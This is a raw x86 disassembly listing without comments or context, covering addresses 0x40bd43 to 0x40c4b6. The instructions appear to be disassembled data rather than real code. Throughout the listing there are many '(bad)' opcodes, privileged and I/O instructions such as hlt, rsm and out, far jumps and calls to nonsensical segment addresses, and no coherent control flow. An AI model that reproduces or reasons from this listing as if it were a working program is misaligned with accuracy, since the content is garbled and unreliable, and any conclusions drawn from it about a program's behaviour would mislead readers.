  40bd43:	push   esp
  40bd44:	mov    al,0xcb
  40bd46:	and    bh,0x4d
  40bd49:	je     0x40bcd1
  40bd4b:	sub    bl,BYTE PTR [eax]
  40bd4d:	pusha  
  40bd4e:	adc    ebx,DWORD PTR [eax+0x3323539a]
  40bd54:	xor    al,bh
  40bd56:	push   esi
  40bd57:	int    0xa
  40bd59:	aaa    
  40bd5a:	mov    WORD PTR [eax+0x184b076b],?
  40bd60:	retf   0xda30
  40bd63:	and    ebp,esi
  40bd65:	lods   al,BYTE PTR ds:[esi]
  40bd66:	mov    al,0xf8
  40bd68:	or     eax,0x91cf53dc
  40bd6d:	pop    ss
  40bd6e:	inc    ecx
  40bd6f:	pop    ebx
  40bd70:	fwait
  40bd71:	add    dl,bh
  40bd73:	push   ecx
  40bd74:	call   DWORD PTR [ebp+0x6c084271]
  40bd7a:	mov    cl,0x4e
  40bd7c:	hlt    
  40bd7d:	push   ebp
  40bd7e:	or     dl,0xfa
  40bd81:	pop    ebx
  40bd82:	xor    eax,0x27c2dd4e
  40bd87:	call   0x79acfc54
  40bd8c:	xor    eax,0x69bfd85f
  40bd91:	inc    ecx
  40bd92:	mov    ds:0xfdbaef7b,eax
  40bd97:	sbb    eax,0x58f2596c
  40bd9c:	test   BYTE PTR [edi+0x38],ah
  40bd9f:	xchg   ebp,edi
  40bda1:	and    BYTE PTR [edi+0x51],bl
  40bda4:	out    dx,eax
  40bda5:	(bad)  [esi]
  40bda7:	pop    edx
  40bda8:	xchg   edx,eax
  40bda9:	repz rcl BYTE PTR [edi],0xd5
  40bdad:	jbe    0x40be19
  40bdaf:	dec    ebx
  40bdb0:	cmp    al,bl
  40bdb2:	addr16 int3 
  40bdb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdb5:	iret   
  40bdb6:	push   edi
  40bdb7:	outs   dx,BYTE PTR ds:[esi]
  40bdb8:	or     DWORD PTR [edx],esi
  40bdba:	inc    ebp
  40bdbb:	cld    
  40bdbc:	daa    
  40bdbd:	lds    esi,FWORD PTR [esi-0x4531704]
  40bdc3:	xchg   BYTE PTR [ebx+0x238e0433],cl
  40bdc9:	mov    edi,0xf1653562
  40bdce:	jle    0x40bd9b
  40bdd0:	inc    edx
  40bdd1:	xor    DWORD PTR [ecx+0x1c],ebx
  40bdd4:	(bad)  
  40bdd5:	mov    esi,0x85c42c4
  40bdda:	fst    DWORD PTR ds:0x2f3f1938
  40bde0:	xchg   edx,eax
  40bde1:	arpl   WORD PTR [ebx+0x2834f8c5],sp
  40bde7:	stos   BYTE PTR es:[edi],al
  40bde8:	pop    ebx
  40bde9:	jecxz  0x40be3f
  40bdeb:	xchg   edi,eax
  40bdec:	ret    
  40bded:	mov    al,0x28
  40bdef:	dec    ebx
  40bdf0:	and    eax,0x90086105
  40bdf5:	push   ss
  40bdf6:	dec    edx
  40bdf7:	and    al,0xf0
  40bdf9:	loop   0x40bdd2
  40bdfb:	hlt    
  40bdfc:	sbb    al,0x54
  40bdfe:	push   esi
  40bdff:	cmp    edx,DWORD PTR [edx-0x21cf3313]
  40be05:	fst    QWORD PTR ds:0xd50f542a
  40be0b:	dec    eax
  40be0c:	push   edi
  40be0d:	or     dh,ah
  40be0f:	jae    0x40be04
  40be11:	or     al,0x4a
  40be13:	loopne 0x40bdf5
  40be15:	xor    esp,eax
  40be17:	call   0x531b99ac
  40be1c:	add    DWORD PTR [edx+0x3a],0xce7ce4e7
  40be23:	inc    ebx
  40be24:	xchg   ebx,eax
  40be25:	push   esi
  40be26:	lods   eax,DWORD PTR ds:[esi]
  40be27:	push   edx
  40be28:	xchg   esi,eax
  40be29:	pop    edi
  40be2a:	loope  0x40be47
  40be2c:	retf   0xe821
  40be2f:	or     eax,edx
  40be31:	(bad)  
  40be32:	mov    gs,WORD PTR [edi]
  40be34:	dec    edi
  40be35:	ins    BYTE PTR es:[edi],dx
  40be36:	add    eax,0x21e6c37b
  40be3b:	add    edx,edx
  40be3d:	xchg   ecx,eax
  40be3e:	pop    ss
  40be3f:	rsm    
  40be41:	stos   DWORD PTR es:[edi],eax
  40be42:	mov    esp,0x4dc1c3df
  40be47:	mov    bh,0xca
  40be49:	mov    ebx,0xe8ed4988
  40be4e:	mov    bl,0xb2
  40be50:	imul   ebx,DWORD PTR [ebp-0x7ab8e180],0xffffffe7
  40be57:	fisub  DWORD PTR [edx-0x43]
  40be5a:	or     BYTE PTR [esi+0x47945a27],0x6a
  40be61:	cmp    BYTE PTR [ebx],0x4f
  40be64:	lock push 0x2e
  40be67:	mov    edi,0x3a9ca8d4
  40be6c:	mov    dh,BYTE PTR [ebp-0xff084cf]
  40be72:	rcr    DWORD PTR [eax],cl
  40be74:	fwait
  40be75:	jp     0x40be64
  40be77:	mov    ds:0xd84f5148,al
  40be7c:	pop    esi
  40be7d:	jg     0x40bedc
  40be7f:	fcomp  QWORD PTR [edi]
  40be82:	xchg   esp,eax
  40be83:	paddsb mm6,QWORD PTR [edx-0x2e477cf3]
  40be8a:	cmp    eax,0x3632bf1a
  40be8f:	and    DWORD PTR [esi],0x9c33c17a
  40be95:	xor    al,0x4d
  40be97:	(bad)  
  40be98:	adc    esi,DWORD PTR [eax+0x65]
  40be9b:	std    
  40be9c:	cmp    ch,al
  40be9e:	fcom   QWORD PTR [edi-0x774921d]
  40bea4:	pop    ss
  40bea5:	sub    esp,DWORD PTR [ebx+0x6ac3ba0]
  40beab:	sub    eax,0x7a4893ca
  40beb0:	or     eax,0xf241791c
  40beb5:	mov    al,0xaf
  40beb7:	mov    DWORD PTR [edi-0x6b34d21b],edi
  40bebd:	cmp    al,0xc0
  40bebf:	sbb    esi,edx
  40bec1:	das    
  40bec2:	lods   eax,DWORD PTR ds:[esi]
  40bec3:	popa   
  40bec4:	sub    BYTE PTR [esi+0x2b],dh
  40bec7:	xchg   ebp,eax
  40bec8:	ret    
  40bec9:	add    BYTE PTR [ebx+0x57],0xe2
  40becd:	imul   DWORD PTR [esp+ebx*4-0x2c]
  40bed1:	inc    ebx
  40bed2:	push   ebp
  40bed3:	es (bad) 
  40bed5:	jae    0x40bf44
  40bed7:	lds    edi,FWORD PTR [ebp-0x76]
  40beda:	mov    dh,0x98
  40bedc:	leave  
  40bedd:	fistp  DWORD PTR [ebx-0x13]
  40bee0:	lea    esi,[ecx-0x237ced81]
  40bee6:	retf   
  40bee7:	mov    bh,0xd1
  40bee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beea:	les    ecx,FWORD PTR [esi+0x792a9982]
  40bef0:	mov    ds:0xa038ec0c,eax
  40bef5:	and    DWORD PTR ds:0x47c37592,esi
  40befb:	cmp    BYTE PTR [ebx+edx*2-0x40c5c02c],ch
  40bf02:	shr    esp,cl
  40bf04:	adc    eax,0xf5c68631
  40bf09:	cmp    al,BYTE PTR [ecx-0x36]
  40bf0c:	xor    edi,DWORD PTR [ebp+0x2f0b81fd]
  40bf12:	xchg   edi,eax
  40bf13:	mov    cl,0x57
  40bf15:	rol    DWORD PTR [ecx],cl
  40bf17:	mov    ds:0x59c03f7f,eax
  40bf1c:	pushf  
  40bf1d:	push   ebp
  40bf1e:	xchg   edi,eax
  40bf1f:	inc    ebx
  40bf20:	pop    ds
  40bf21:	sti    
  40bf22:	cmp    BYTE PTR [edi+eax*1],al
  40bf25:	and    eax,0x62c9db1b
  40bf2a:	add    BYTE PTR es:0xcde55150,0x8d
  40bf32:	sbb    cl,BYTE PTR [eax-0x54cc4762]
  40bf38:	into   
  40bf39:	shl    DWORD PTR [ebx-0x53],1
  40bf3c:	or     bh,BYTE PTR [edx]
  40bf3e:	push   ebx
  40bf3f:	fsub   st(0),st
  40bf41:	jp     0x40bf1a
  40bf43:	dec    ecx
  40bf44:	mov    edi,0x42562994
  40bf49:	mov    edi,0xe387a23a
  40bf4e:	mov    edi,0xaf41fd87
  40bf53:	jae    0x40bf2d
  40bf55:	lods   eax,DWORD PTR fs:[esi]
  40bf57:	adc    DWORD PTR [edx-0x5b],eax
  40bf5a:	xchg   ebp,eax
  40bf5b:	into   
  40bf5c:	ja     0x40befa
  40bf5e:	mov    eax,ds:0xa7e7fb71
  40bf63:	sub    DWORD PTR [ecx],0x2c
  40bf66:	ins    DWORD PTR es:[edi],dx
  40bf67:	repnz les ebp,FWORD PTR [esi]
  40bf6a:	mov    ds:0xdd14ca8d,al
  40bf6f:	jo     0x40bf10
  40bf71:	dec    ecx
  40bf72:	movzx  ebp,BYTE PTR [ebp-0x45]
  40bf76:	pop    es
  40bf77:	inc    ebp
  40bf78:	outs   dx,BYTE PTR ds:[esi]
  40bf79:	cld    
  40bf7a:	add    DWORD PTR [edi+0x3],esi
  40bf7d:	cmp    eax,0xf064b2f2
  40bf82:	out    0x46,al
  40bf84:	push   eax
  40bf85:	shr    bh,1
  40bf87:	xchg   edx,eax
  40bf88:	xor    al,BYTE PTR [eax-0x37]
  40bf8b:	sub    ch,cl
  40bf8d:	mov    al,ds:0x783bbfc5
  40bf92:	jmp    0x40bf52
  40bf94:	popa   
  40bf95:	pop    edx
  40bf96:	xlat   BYTE PTR ds:[ebx]
  40bf97:	idiv   DWORD PTR gs:[ebx-0x62626d20]
  40bf9e:	scas   al,BYTE PTR es:[edi]
  40bf9f:	push   edi
  40bfa0:	mov    ecx,0x5dfc20eb
  40bfa5:	mov    esi,0x7e3259f8
  40bfaa:	adc    ecx,DWORD PTR [edi]
  40bfac:	cwde   
  40bfad:	push   0x7217d982
  40bfb2:	mov    WORD PTR [esi-0x5a36a2a],gs
  40bfb8:	xor    eax,0xde382ab9
  40bfbd:	xor    BYTE PTR [edi+0x13],dh
  40bfc0:	scas   eax,DWORD PTR es:[edi]
  40bfc1:	gs sahf 
  40bfc3:	xlat   BYTE PTR ds:[ebx]
  40bfc4:	jo     0x40bfaa
  40bfc6:	int3   
  40bfc7:	inc    eax
  40bfc8:	std    
  40bfc9:	cmp    ecx,DWORD PTR [edi-0x2858e167]
  40bfcf:	push   esi
  40bfd0:	ret    
  40bfd1:	pushf  
  40bfd2:	ror    BYTE PTR [edi+edx*2+0x8],1
  40bfd6:	sbb    edi,esi
  40bfd8:	jae    0x40bfa1
  40bfda:	lods   al,BYTE PTR ds:[esi]
  40bfdb:	add    ebx,ecx
  40bfdd:	(bad)  
  40bfde:	xchg   ebp,eax
  40bfdf:	cdq    
  40bfe0:	imul   esp,DWORD PTR [edi+0x44e57ba2],0x89c34d45
  40bfea:	push   es
  40bfeb:	lods   al,BYTE PTR ds:[esi]
  40bfec:	(bad)  
  40bfee:	dec    ebx
  40bfef:	and    DWORD PTR [ebx-0x46b4e9f5],edi
  40bff5:	popf   
  40bff6:	inc    esi
  40bff7:	jmp    0x40c00b
  40bff9:	jae    0x40bfa2
  40bffb:	mov    ecx,DWORD PTR [edx]
  40bffd:	xor    DWORD PTR ds:0xc381465c,esi
  40c003:	cwde   
  40c004:	push   esp
  40c005:	sub    DWORD PTR [edx-0x67],ebx
  40c008:	shl    ah,0xd0
  40c00b:	in     al,0xd8
  40c00d:	outs   dx,BYTE PTR ds:[esi]
  40c00e:	stos   BYTE PTR es:[edi],al
  40c00f:	xchg   ax,ax
  40c011:	(bad)  
  40c012:	(bad)  
  40c013:	imul   esi,esp,0xffffffad
  40c016:	pusha  
  40c017:	push   esi
  40c018:	add    bl,dh
  40c01a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c01b:	mov    bl,0x70
  40c01d:	inc    edx
  40c01e:	jns    0x40bfc9
  40c020:	dec    esp
  40c021:	cwde   
  40c022:	mov    cl,0x6a
  40c024:	daa    
  40c025:	xchg   esi,eax
  40c026:	and    DWORD PTR [eax-0x87e2c77],esi
  40c02c:	push   0xffffffa8
  40c02e:	out    dx,eax
  40c02f:	push   es
  40c030:	adc    al,0x17
  40c032:	mov    edi,DWORD PTR [ecx+0x1337fa88]
  40c038:	hlt    
  40c039:	rol    BYTE PTR [ebp-0x789e83b7],0xc5
  40c040:	push   ds
  40c041:	mov    DWORD PTR [ecx],esi
  40c043:	loop   0x40c088
  40c045:	fcom   DWORD PTR [edi]
  40c047:	jb     0x40c04f
  40c049:	add    BYTE PTR [ebx+0x10c18eb7],0x62
  40c050:	jae    0x40c0a2
  40c052:	call   0x551581ed
  40c057:	cld    
  40c058:	mov    bl,0xa3
  40c05a:	inc    ecx
  40c05b:	clc    
  40c05c:	jnp    0x40c052
  40c05e:	push   0xffffffbc
  40c060:	push   ebx
  40c061:	push   ecx
  40c062:	or     bl,BYTE PTR ds:0x40d8c0a
  40c068:	xchg   esi,eax
  40c069:	jae    0x40c0d4
  40c06b:	(bad)  
  40c06c:	int    0xfd
  40c06e:	inc    eax
  40c06f:	icebp  
  40c070:	mov    eax,0xb00dbb9e
  40c075:	lods   al,BYTE PTR ds:[esi]
  40c076:	push   eax
  40c077:	popf   
  40c078:	lahf   
  40c079:	and    eax,0x4b37d44f
  40c07e:	sbb    BYTE PTR [ebx-0x8],bh
  40c081:	mov    ah,0xa9
  40c083:	test   DWORD PTR [ecx-0x6a],esi
  40c086:	bound  eax,QWORD PTR [eax-0x44178a7]
  40c08c:	imul   edi,DWORD PTR [esp+eax*1+0x26f4712c],0x60
  40c094:	add    esp,esi
  40c096:	repz add BYTE PTR [edi],al
  40c099:	sub    al,bh
  40c09b:	jmp    0x8efb:0x3d031e63
  40c0a2:	jmp    0xc65f:0xfa736fd1
  40c0a9:	outs   dx,BYTE PTR ds:[esi]
  40c0aa:	xchg   edx,eax
  40c0ab:	push   ebx
  40c0ac:	pop    esi
  40c0ad:	dec    ebp
  40c0ae:	sti    
  40c0af:	sub    eax,0x58ebc5
  40c0b4:	mov    ebx,0x6a19643d
  40c0b9:	or     BYTE PTR [edi+0x31],bl
  40c0bc:	imul   edx,DWORD PTR [ebx],0x21
  40c0bf:	loope  0x40c0e5
  40c0c1:	das    
  40c0c2:	add    DWORD PTR [edi+0x7e],esi
  40c0c5:	rcl    BYTE PTR [edi-0x2928653a],0x23
  40c0cc:	pushf  
  40c0cd:	pop    ebx
  40c0ce:	and    eax,0x994f43f0
  40c0d3:	aam    0x82
  40c0d5:	pop    es
  40c0d6:	jecxz  0x40c088
  40c0d8:	push   0x4b
  40c0da:	dec    ebp
  40c0db:	ret    0x6ab8
  40c0de:	js     0x40c150
  40c0e0:	sahf   
  40c0e1:	mov    ecx,0x7ea51f1b
  40c0e6:	ss dec eax
  40c0e8:	push   ebx
  40c0e9:	or     DWORD PTR [ecx+0x6f],ebx
  40c0ec:	test   eax,eax
  40c0ee:	dec    edi
  40c0ef:	push   esi
  40c0f0:	idiv   BYTE PTR [ebx+0x5b4aa46b]
  40c0f6:	(bad)  
  40c0f7:	repnz retf 
  40c0f9:	mov    edx,0x55661df3
  40c0fe:	lea    edi,[edx-0x64c34caa]
  40c104:	pop    edi
  40c105:	xchg   ebp,eax
  40c106:	pop    eax
  40c107:	add    cl,ch
  40c109:	popf   
  40c10a:	aad    0x61
  40c10c:	xor    eax,DWORD PTR ds:0x68c2b494
  40c112:	inc    ecx
  40c113:	pop    esp
  40c114:	jecxz  0x40c0cb
  40c116:	jge    0x40c12a
  40c118:	in     eax,dx
  40c119:	mov    ebp,0x380a47b5
  40c11e:	retf   0x6a65
  40c121:	aas    
  40c122:	jmp    0x40c0b4
  40c124:	or     dh,BYTE PTR [edi+0x65]
  40c127:	pop    edx
  40c128:	add    eax,0x77eac03a
  40c12d:	inc    ebx
  40c12e:	cmp    ch,BYTE PTR [edi]
  40c130:	int3   
  40c131:	inc    ebp
  40c132:	mov    WORD PTR [eax+0x31],es
  40c135:	inc    esi
  40c136:	out    0x60,al
  40c138:	mov    esi,0xad1b9d60
  40c13d:	les    esi,FWORD PTR ss:[esi-0x51ec856]
  40c144:	push   ecx
  40c145:	(bad)  
  40c146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c147:	test   al,0x3
  40c149:	test   al,0xa7
  40c14b:	and    ebx,DWORD PTR [esi]
  40c14d:	ds call 0xb7a1cd30
  40c153:	pushf  
  40c154:	test   BYTE PTR ds:0xd09b2c7c,dl
  40c15a:	push   es
  40c15b:	dec    esi
  40c15c:	aaa    
  40c15d:	addr16 pop esp
  40c15f:	mov    eax,ds:0x19601acf
  40c164:	ja     0x40c170
  40c166:	aad    0x42
  40c168:	sar    DWORD PTR [eax-0xcb66f5d],cl
  40c16e:	test   DWORD PTR [ebp-0x38a68ac9],esp
  40c174:	repz loope 0x40c189
  40c177:	icebp  
  40c178:	sub    DWORD PTR [esi-0x51cabfac],esp
  40c17e:	sub    BYTE PTR [ecx+ebx*2+0x66],cl
  40c182:	cmp    DWORD PTR [ecx],edi
  40c184:	mov    ds:0x233ac1e9,eax
  40c189:	xor    edi,0x2f
  40c18c:	jle    0x40c144
  40c18e:	out    0x7a,al
  40c190:	int3   
  40c191:	rcl    BYTE PTR [esi],0x61
  40c194:	cli    
  40c195:	cmp    al,0x1
  40c197:	fnstsw WORD PTR [edx-0x7]
  40c19a:	sbb    DWORD PTR ds:0x99465ce6,ebx
  40c1a0:	jae    0x40c15a
  40c1a2:	ja     0x40c1aa
  40c1a4:	push   ecx
  40c1a5:	inc    ecx
  40c1a6:	je     0x40c1b7
  40c1a8:	in     al,dx
  40c1a9:	xor    BYTE PTR [ebx],cl
  40c1ab:	xor    BYTE PTR [edi+0x5a8cdb3f],ah
  40c1b1:	lea    esp,ds:0x13c51a2f
  40c1b7:	sbb    BYTE PTR [ecx+0x5d3d0373],cl
  40c1bd:	cmp    BYTE PTR [esi],dl
  40c1bf:	jbe    0x40c164
  40c1c1:	aam    0x81
  40c1c3:	jg     0x40c232
  40c1c5:	rcr    BYTE PTR [ebx+0xbf9fe5],1
  40c1cb:	js     0x40c15e
  40c1cd:	mov    edx,0x289c6bad
  40c1d2:	push   es
  40c1d3:	or     cl,BYTE PTR [edx+ebp*4+0x6202c106]
  40c1da:	and    ecx,DWORD PTR [ecx+0x6b57b067]
  40c1e0:	or     BYTE PTR [eax],al
  40c1e2:	jl     0x40c1fa
  40c1e4:	ds out 0x3a,eax
  40c1e7:	sub    BYTE PTR [esi+0x97f7241],bl
  40c1ed:	push   DWORD PTR [edx-0x44]
  40c1f0:	lock mov cl,0xa9
  40c1f3:	stc    
  40c1f4:	mov    bl,0x7a
  40c1f6:	ud0    ebx,DWORD PTR [ebx-0x6]
  40c1fa:	test   al,0x35
  40c1fc:	aam    0x6f
  40c1fe:	test   al,0xdf
  40c200:	xchg   ebp,eax
  40c201:	fcom   DWORD PTR [ebx+0x48]
  40c204:	jno    0x40c1d4
  40c206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c207:	imul   ecx,ebx,0x5f
  40c20a:	push   edx
  40c20b:	sbb    DWORD PTR [edi-0x34be2de8],edx
  40c211:	xor    al,0x7c
  40c213:	bound  esp,QWORD PTR [esi]
  40c215:	cdq    
  40c216:	stos   BYTE PTR es:[edi],al
  40c217:	xor    edi,ebx
  40c219:	test   DWORD PTR [esi],ebx
  40c21b:	push   cs
  40c21c:	jge    0x40c257
  40c21e:	sti    
  40c21f:	or     BYTE PTR [ebp-0x631277a0],dh
  40c225:	xor    eax,0x1da98196
  40c22a:	(bad)  
  40c22c:	fld    st(7)
  40c22e:	and    al,0xa3
  40c230:	ja     0x40c29d
  40c232:	cli    
  40c233:	jg     0x40c273
  40c235:	mov    ch,0x71
  40c237:	cdq    
  40c238:	adc    cl,BYTE PTR [eax]
  40c23a:	jb     0x40c21f
  40c23c:	cmp    ch,0xcf
  40c23f:	sahf   
  40c240:	xchg   ebp,eax
  40c241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c242:	inc    ebp
  40c243:	test   al,0x71
  40c245:	and    dl,al
  40c247:	sub    ecx,DWORD PTR [edi]
  40c249:	cmp    al,0x66
  40c24b:	pop    ebp
  40c24c:	inc    edi
  40c24d:	enter  0x403a,0x21
  40c251:	dec    esi
  40c252:	mov    esi,0x3251c047
  40c257:	ins    BYTE PTR es:[edi],dx
  40c258:	cmp    al,BYTE PTR [edx-0x29043c4e]
  40c25e:	scas   eax,DWORD PTR es:[edi]
  40c25f:	or     al,BYTE PTR [ebx+0x1f238cd9]
  40c265:	push   es
  40c266:	fcom   st(1)
  40c268:	jmp    0xd4ffaa0
  40c26d:	imul   edx,DWORD PTR [ebp+0x293ca5a6],0x331517e6
  40c277:	out    0x39,al
  40c279:	aas    
  40c27a:	mov    ah,0x22
  40c27c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c27d:	es jp  0x40c21a
  40c280:	aam    0x8c
  40c282:	(bad)  
  40c283:	loope  0x40c301
  40c285:	push   esp
  40c286:	test   ah,bl
  40c288:	stc    
  40c289:	mov    ebp,0x4ea00c4c
  40c28e:	sub    al,0x64
  40c290:	mov    bl,0x9e
  40c292:	cdq    
  40c293:	aad    0x2b
  40c295:	cdq    
  40c296:	daa    
  40c297:	xlat   BYTE PTR ds:[ebx]
  40c298:	ja     0x40c2f2
  40c29a:	jae    0x40c257
  40c29c:	call   0x56a4:0x987997cf
  40c2a3:	sar    ebp,1
  40c2a5:	sbb    eax,0xeb823249
  40c2aa:	mov    edi,0x8b84028e
  40c2af:	pop    edx
  40c2b0:	mov    eax,0xd33d2553
  40c2b5:	hlt    
  40c2b6:	pop    ebp
  40c2b7:	fsubr  DWORD PTR [edi]
  40c2b9:	sahf   
  40c2ba:	mov    edi,0xf60a2a40
  40c2bf:	sub    ah,ah
  40c2c1:	int    0xa
  40c2c3:	dec    edi
  40c2c4:	inc    esp
  40c2c5:	add    BYTE PTR [ebx+eiz*4-0x72],0xb1
  40c2ca:	mov    esp,0xfe048f11
  40c2cf:	stos   BYTE PTR es:[edi],al
  40c2d0:	ret    0x6428
  40c2d3:	push   ds
  40c2d4:	out    0x81,al
  40c2d6:	loope  0x40c258
  40c2d8:	cmp    dl,BYTE PTR [esi+0xb9592fa]
  40c2de:	rcl    BYTE PTR [ebp-0x6bbcd29b],1
  40c2e4:	(bad)  
  40c2e6:	push   edi
  40c2e7:	mov    esp,0x252047f3
  40c2ec:	frstor [edx]
  40c2ee:	push   0xffffffa4
  40c2f0:	ds push cs
  40c2f2:	pop    ebx
  40c2f3:	mov    BYTE PTR [edx+0x3b],dl
  40c2f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2f7:	xchg   ebp,eax
  40c2f8:	fnstenv [esi+eax*1]
  40c2fb:	xor    DWORD PTR [ecx+0x2015f35],0x6
  40c302:	jge    0x40c2bf
  40c304:	clc    
  40c305:	xchg   ebx,eax
  40c306:	adc    al,0x18
  40c309:	cmp    BYTE PTR [eax],al
  40c30b:	es cwde 
  40c30d:	std    
  40c30e:	pop    eax
  40c30f:	or     dh,dh
  40c311:	jp     0x40c29b
  40c313:	xor    ecx,DWORD PTR [ebx]
  40c315:	bound  esi,QWORD PTR [eax+0x1f]
  40c318:	cmp    bh,ah
  40c31a:	jmp    0xc7d8273f
  40c31f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c320:	add    al,0x81
  40c322:	rcr    BYTE PTR [ebx-0x13935e5b],cl
  40c328:	xlat   BYTE PTR ds:[ebx]
  40c329:	or     bl,BYTE PTR [edx+0x41]
  40c32c:	or     BYTE PTR [ebx+0x45f0b34b],al
  40c332:	inc    ebp
  40c333:	mov    ecx,DWORD PTR [ebx-0x16]
  40c336:	mov    edx,DWORD PTR [eax+0x30]
  40c339:	aas    
  40c33a:	lods   al,BYTE PTR ds:[esi]
  40c33b:	pop    esp
  40c33c:	push   ss
  40c33d:	jnp    0x40c355
  40c33f:	lock fdivr DWORD PTR [eax]
  40c342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c343:	or     al,0xda
  40c345:	test   al,0xe7
  40c347:	inc    edi
  40c348:	out    0x17,eax
  40c34a:	cmp    BYTE PTR [ebx+eax*2],ch
  40c34d:	mov    ch,0x65
  40c34f:	hlt    
  40c350:	mov    ds:0x56602a5d,al
  40c355:	ja     0x40c30c
  40c357:	std    
  40c358:	or     al,bl
  40c35a:	push   0xfcc11121
  40c35f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c360:	cmc    
  40c361:	ins    BYTE PTR es:[edi],dx
  40c362:	data16 out 0x6c,al
  40c365:	xor    al,0xb3
  40c367:	mov    ecx,0xc40fde0
  40c36c:	jmp    0x40c3a7
  40c36e:	fcmovb st,st(5)
  40c370:	addr16 pop edx
  40c372:	mov    cl,0x5c
  40c374:	xchg   ecx,eax
  40c375:	cmp    eax,0xd1fdbf65
  40c37a:	out    0xed,eax
  40c37c:	inc    edx
  40c37d:	sub    DWORD PTR [esi],0xb8c39d83
  40c383:	iret   
  40c384:	(bad)  
  40c385:	rol    ebx,cl
  40c387:	int3   
  40c388:	ret    
  40c389:	cmp    bh,dl
  40c38b:	std    
  40c38c:	out    0xd4,al
  40c38e:	ror    BYTE PTR [eax-0x3],0x35
  40c392:	jg     0x40c3b5
  40c394:	repnz xchg esi,eax
  40c396:	jge    0x40c320
  40c398:	hlt    
  40c399:	and    BYTE PTR [edx-0x286a7bb6],bl
  40c39f:	loop   0x40c36a
  40c3a1:	mov    ebp,ebp
  40c3a3:	ins    DWORD PTR es:[edi],dx
  40c3a4:	add    dh,bl
  40c3a6:	gs ret 
  40c3a8:	xchg   esp,eax
  40c3a9:	add    BYTE PTR [edx-0x19],0xaa
  40c3ad:	mov    esp,0x7155dded
  40c3b2:	mov    dh,0x80
  40c3b4:	adc    eax,0x51cd55f0
  40c3b9:	cld    
  40c3ba:	hlt    
  40c3bb:	in     al,dx
  40c3bc:	std    
  40c3bd:	punpckhbw mm2,QWORD PTR [edi+0x5a]
  40c3c1:	cmp    DWORD PTR [ecx],0x1a
  40c3c4:	retf   0x75d6
  40c3c7:	es dec ebp
  40c3c9:	cmp    ah,BYTE PTR [edi]
  40c3cb:	fs xchg esp,eax
  40c3cd:	div    DWORD PTR [eax+0xb]
  40c3d0:	shl    BYTE PTR [esi],1
  40c3d2:	cwde   
  40c3d3:	(bad)  
  40c3d4:	(bad)  
  40c3d6:	mov    bh,0x43
  40c3d8:	ins    DWORD PTR es:[edi],dx
  40c3d9:	loopne 0x40c415
  40c3db:	int    0xbe
  40c3dd:	sbb    eax,0xf2fd2228
  40c3e2:	rcl    DWORD PTR [ebx],0xfe
  40c3e5:	jno    0x40c384
  40c3e7:	nop
  40c3e8:	mov    ebp,0xc945af9a
  40c3ed:	push   0x25
  40c3ef:	and    DWORD PTR [ebp+0x36],eax
  40c3f2:	mov    WORD PTR [edx+0x5656d521],cs
  40c3f8:	mov    esi,0xab9970f3
  40c3fd:	daa    
  40c3fe:	stos   DWORD PTR es:[edi],eax
  40c3ff:	rcr    dh,0x2d
  40c402:	mov    es,WORD PTR [edx]
  40c404:	mul    BYTE PTR [ebp+0x34]
  40c407:	ror    DWORD PTR [ebp-0x21af0b2],cl
  40c40d:	sahf   
  40c40e:	int3   
  40c40f:	cmp    bl,BYTE PTR [eax+0x4e]
  40c412:	xchg   esp,eax
  40c413:	sub    BYTE PTR [eax+ebp*8-0x31],al
  40c417:	fwait
  40c418:	sbb    ch,BYTE PTR [ebx-0x793eaeb8]
  40c41e:	sub    al,0xa8
  40c420:	enter  0x51c7,0x65
  40c424:	jmp    0x40c429
  40c426:	mov    bh,0x91
  40c428:	sub    al,0x53
  40c42a:	popa   
  40c42b:	loop   0x40c48a
  40c42d:	rcl    BYTE PTR [edx],cl
  40c42f:	and    ebx,ebx
  40c431:	inc    esi
  40c432:	ins    DWORD PTR es:[edi],dx
  40c433:	xor    dl,ch
  40c435:	test   BYTE PTR [edx+0x3e9b5d64],0x73
  40c43c:	jg     0x40c48f
  40c43e:	jecxz  0x40c408
  40c440:	jmp    0x40c480
  40c442:	pop    esi
  40c443:	mov    cl,0xa2
  40c445:	push   ecx
  40c446:	repnz xor DWORD PTR [esi-0x36c50934],0xffffff86
  40c44e:	in     al,dx
  40c44f:	lahf   
  40c450:	leave  
  40c451:	xor    bl,BYTE PTR [esi+0x700fa5df]
  40c457:	xchg   esi,eax
  40c458:	je     0x40c46c
  40c45a:	fwait
  40c45b:	pop    ebp
  40c45c:	retf   0xf1b9
  40c45f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c460:	xchg   DWORD PTR [edx-0x600b156b],ebp
  40c466:	push   ds
  40c467:	or     DWORD PTR [ebx-0x43],edx
  40c46a:	call   0xa441:0x2b545ada
  40c471:	lods   al,BYTE PTR ds:[esi]
  40c472:	in     eax,0x41
  40c474:	ja     0x40c49f
  40c476:	cli    
  40c477:	pop    esp
  40c478:	not    BYTE PTR [esi-0x22e8cd6d]
  40c47e:	sub    edx,ebx
  40c480:	mov    BYTE PTR [ecx],ch
  40c482:	xlat   BYTE PTR ds:[ebx]
  40c483:	out    dx,al
  40c484:	in     eax,0x15
  40c486:	dec    ecx
  40c487:	mov    bl,0x11
  40c489:	mov    ecx,0x48d72b45
  40c48e:	push   0x4a
  40c490:	and    al,0xf0
  40c492:	push   0x51c4c69b
  40c497:	xchg   esi,eax
  40c498:	clc    
  40c499:	sub    edi,ebx
  40c49b:	push   0xa63198a9
  40c4a0:	das    
  40c4a1:	in     al,dx
  40c4a2:	scas   eax,DWORD PTR es:[edi]
  40c4a3:	gs stc 
  40c4a5:	data16 and dh,dh
  40c4a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4a9:	add    cl,dh
  40c4ab:	pop    ds
  40c4ac:	in     al,dx
  40c4ad:	int    0x22
  40c4af:	push   ecx
  40c4b0:	popf   
  40c4b1:	mov    edx,0x7348f47f
  40c4b6:	mov    al,ds:0x8e42a7bf
